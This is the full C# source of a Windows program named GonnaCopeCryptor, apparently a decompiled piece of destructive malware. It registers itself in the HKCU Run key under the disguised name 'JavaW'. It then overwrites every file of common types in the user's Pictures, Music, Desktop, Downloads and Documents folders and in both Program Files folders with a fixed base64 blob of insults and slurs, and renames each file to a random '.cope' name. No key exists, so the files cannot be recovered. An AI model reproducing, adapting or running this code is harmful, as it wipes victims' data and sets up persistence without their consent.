using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace GonnaCopeCryptor;

internal class Program
{
	public static string StringGen(int length)
	{
		Random random = new Random();
		return new string((from s in Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	public static void crypt(string dir, string extension)
	{
		string[] files = Directory.GetFiles(dir, "*." + extension, SearchOption.AllDirectories);
		string[] array = files;
		foreach (string text in array)
		{
			if (!(text == extension + "/GonnaCopeDL.exe"))
			{
				File.WriteAllText(text, "");
				File.WriteAllText(text, "TCArIGRvbuKAmXQgY2FyZSArIGRpZG7igJl0IGFzayArIGNyeSBhYm91dCBpdCArIHdobyBhc2tlZCArIHN0YXkgbWFkICsgZ2V0IHJlYWwgKyBibGVlZCArIG1hbGQgc2VldGhlIGNvcGUgaGFyZGVyICsgZGlsYXRlICsgaW5jb3JyZWN0ICsgaG9lcyBtYWQgKyBwb3VuZCBzYW5kICsgYmFzaWMgc2tpbGwgaXNzdWUgKyB0eXBvICsgdXIgZGFkIGxlZnQgKyB5b3UgZmVsbCBvZmYgKyBubyB1ICsgdGhlIGF1ZGFjaXR5ICsgdHJpZ2dlcmVkICsgcmVwZWxsZWQgKyB1ciBhIG1pbm9yICsgay4gKyBhbnkgYXNrZXJzICsgZ2V0IGEgbGlmZSArIG9rIGFuZD8gKyBjcmluZ2UgKyBjb3BpdW0gKyBnbyBvdXRzaWRlICsgdG91Y2ggZ3Jhc3MgKyBraWNrIHJvY2tzICsgcXVvdGUgdHdlZXQgKyB0aGluayBhZ2FpbiArIG5vdCBiYXNlZCArIG5vdCBmdW5ueSBkaWRu4oCZdCBsYXVnaCArIHNvY2lhbCBjcmVkaXRzIC05OTksIDk5OSwgOTk5LCA5OTkgKyBnZXQgZ29vZCArIHJlcG9ydGVkICsgYWQgaG9taW5lbSArIG9rIGJvb21lciArIHNtYWxsIHBwICsgdXIgYWxsZXJnaWMgdG8gc3VubGlnaHQgKyBHRyEgKyBnZXQgcmVrdCArIHRyb2xsZWQgKyB5b3VyIGxvc3MgKyBtdXRlZCArIGJhbm5lZCArIGtpY2tlZCArIHBlcm1hYmFuICsgdXNlbGVzcyArIGkgc2xlcHQgd2l0aCB1ciBtb20gKyB5byBtb21tYSArIHlvIG1vbW1hIHNvIGZhdCArIHJlZHBpbGxlZCArIG5vIGJpdGNoZXMgYWxsb3dlZCArIGkgc2FpZCBpdCBiZXR0ZXIgKyB0aWt0b2sgZmFuICsgZ2V0IGEgbGlmZSArIHVuc3Vic2NyaWJlZCArIHBsdW5kZXJlZCArIGdvIHRlbGwgcmVkZGl0ICsgZG9ub3dhbGxlZCArIHNpbXAgKyBnZXQgc3RpY2tlZCBidWcgTE9MICsgdGFsayBub25zZW5zZSArIHRydW1wIHN1cHBvcnRlciArIHlvdXLigJlyZSBhIGZ1bGwgdGltZSBkaXNjb3JkIG1vZCArIHlvdeKAmXJlKiArIGdyYW1tYXIgaXNzdWUgKyBuZXJkICsgZ2V0IGNsYXBwZWQgKyBreXMgKyBsb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldCArIGdvIG91dHNpZGUgKyBibGVhY2ggKyBsb2wgKyBnYXkgKyByZXRhcmQgKyBhdXRpc3RpYyArIHJlcG9ydGVkICsgYXNrIGRlZXogKyBleiBjbGFwICsgc3RyYWlnaHQgY2FzaCArIGlkZ2FmICsgcmF0aW8gYWdhaW4gKyBzdGF5IG1hZCArIHJlYWQgRkFRICsgeW91cmUgbG9zdCArIHlvdSDigJxyZeKAnSArIHN0YXkgcHJlc3NlZCArIHJldmVyc2UgZG91YmxlIHRha2UgYmFjayArIHBlZG9waGlsZSArIGNhbmNlbGxlZCArIGRvbmUgZm9yICsgZG9uJ3QgZ2l2ZSBhIGRhbW4gKyBnZXQgYSBqb2IgKyBzdXMgKyBiYWthICsgc3Vzc3kgYmFrYSArIGdldCBibG9ja2VkICsgbWFkIGZyZWUgKyBmcmVlciB0aGFuIGFpciArIGZ1cnJ5ICsgcmlwIGJvem8gKyB5b3UncmUgYSAoaW5zZXJ0IHN0ZXJlb3R5cGUpICsgc2xpZ2h0X3NtaWxlICsgYWlyZWQgKyBjcmluZ2UgYWdhaW4gKyBTdXBlciBJZG9s55qE56yR5a65ICsgbWFkIGN1eiBiYWQgKyBteSBwcm9ub3VucyBhcmUgeGUsIHhlbSAmIHh5ciArIGlycmVsZXZhbnQgKyBkZWFsIHdpdGggaXQgKyBzY3JlZW5jYXBwZWQgeW91ciBiaW8gKyBrYXJlbi9reWxlICsgamVhbG91cyArIHlvdSdyZSBkZWFmICsgYmFsbHMgKyBpJ2xsIGJlIHJpZ2h0IGJhY2sgKyBnbyBhaGVhZCB3aGluZSBhYm91dCBpdCArIG5vdCBzdHJhaWdodCArIGVhdCBwYXBlciArIHlvdSBsb3NlICsgY291bnQgdG8gdGhyZWUgKyB5b3VyIHByb2JsZW0gKyBubyBvbmUgY2FyZXMgKyBsb2cgb2ZmICsgZG9uJ3QgY2FyZSBldmVuIG1vcmUgKyBzZXggb2ZmZW5kZXIgKyBzZXggZGVmZW5kZXIgKyBnZXQgcmVsaWdpb24gKyBub3Qgb2theSArIGdsaGYgKyBORlQgb3duZXIgKyB5b3UgbWFrZSBiYWQgbWVtZXMgKyBwcm9ibGVtYXRpYyArIGZhbGwgaW4gbGluZSArIGRvZyB3YXRlciArIHlvdSBsb29rIGxpa2UgYSB3YWxsICsgeW91IGRvbuKAmXQga25vdyAyICsgMiB3aXRoIHlvIGhlYWQgYXNzICsgeW91IGFyZSBnb2luZyB0byBteSBjcmluZ2UgY29tcGlsYXRpb24gKyB5b3UgY2Fu4oCZdCBjb3VudCB0byBmaXZlICsgdHJ5IGFnYWluICsgeW91IGZhaWxlZCBraW5kZXJnYXJ0ZW4gKyByaWNrcm9sbGVkICsgbm8gbGlmZXIgKyBndXRlbiBmcmV1bmRlbiBzY2hpY2t0IG1hbiBlaW5lbiBkZXV0c2NoZW4gcGFuemVyICsgeW91IGhhdmUgYSBhbmltZSBwcm9maWxlIHBpY3R1cmUgKyBhbiogKyBmYXRoZXJsZXNzICsgbW90aGVybGVzcyArIHNpc3Rlcmxlc3MgKyBicm90aGVybGVzcyArIG9ycGhhbiArIHlvdSBjYW4ndCBjYXRjaCB0aGlzIHJhdGlvICsgY2F0Y2ggc29tZSBiaXRjaGVzICsgSSBkb24ndCBjYXJlIGFib3V0IHlvdXIgb3BpbmlvbiArIGdlbnNoaW4gcGxheWVyICsgeW91IGRyZXNzIGxpa2UgZ2FyYmFnZSArIOaXpeacrOiqnuOBjOOBiuS4iuaJi+OBp+OBmeOBrSArIGdldCBmdWNrZWQgKyB5b3UgY2Fu4oCZdCB1bmRlcnN0YW5kIHdoYXQgdGhlIHdvcmQgaW50ZWxsaWdlbmNlIG1lYW5zIHdpdGggeW91ciBkdW1iIGFzcyArIHlvdSBoYXZlIGhhaXIgKyBxdWV1ZWQgKyBwdXQgc29tZSB0aG91Z2h0IGludG8gd2hhdCB5b3UncmUgZ29pbmcgdG8gZG8gd2l0aCB0aGF0ICsgc3RmdSArIGdvIHRvIGJlZCArIHllcywgaSdtIHRhbGxlciB0aGFuIHlvdSArIGkgdGhpbmsgeW91ciBqb2tlIGlzIGZ1bm55ICsgaSByZWplY3RlZCB5b3VyIG1vdGhlcidzIGFkdmFuY2VzICsgbWFyb29uZWQgKyB5b3UgY2Fu4oCZdCByZWFkICsgSSB3aW4gKyBmaW5hbCByYXRpbw==");
				File.Move(text, "Copium-" + StringGen(10).ToString() + ".cope");
				Thread.Sleep(10);
			}
		}
	}

	private static void Main(string[] args)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("JavaW", Application.get_ExecutablePath());
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "js");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "vbs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "cs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "txt");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "mp3");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "mp4");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "png");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "jpg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "jpeg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "rtf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "pdf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "exe");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "doc");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "docx");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "js");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "vbs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "cs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "txt");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "mp3");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "mp4");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "png");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "jpg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "jpeg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "rtf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "pdf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "exe");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "doc");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "docx");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "js");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "vbs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "cs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "txt");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "mp3");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "mp4");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "png");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "jpg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "jpeg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "rtf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "pdf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "exe");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "doc");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "docx");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "js");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "vbs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "cs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "txt");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "mp3");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "mp4");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "png");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "jpg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "jpeg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "rtf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "pdf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "exe");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "doc");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "docx");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "js");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "vbs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "cs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "txt");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "mp3");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "mp4");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "png");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "jpg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "jpeg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "rtf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "pdf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "exe");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "doc");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "docx");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "js");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "vbs");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "cs");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "txt");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "mp4");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "png");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "jpg");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "jpeg");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "rtf");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "pdf");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "exe");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "doc");
		crypt(Environment.GetEnvironmentVariable("USERPROFILE") + "\\Downloads", "docx");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "js");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "vbs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "cs");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "txt");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "mp4");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "png");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "jpg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "jpeg");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "rtf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "pdf");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "exe");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "jar");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "doc");
		crypt(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "docx");
	}
}
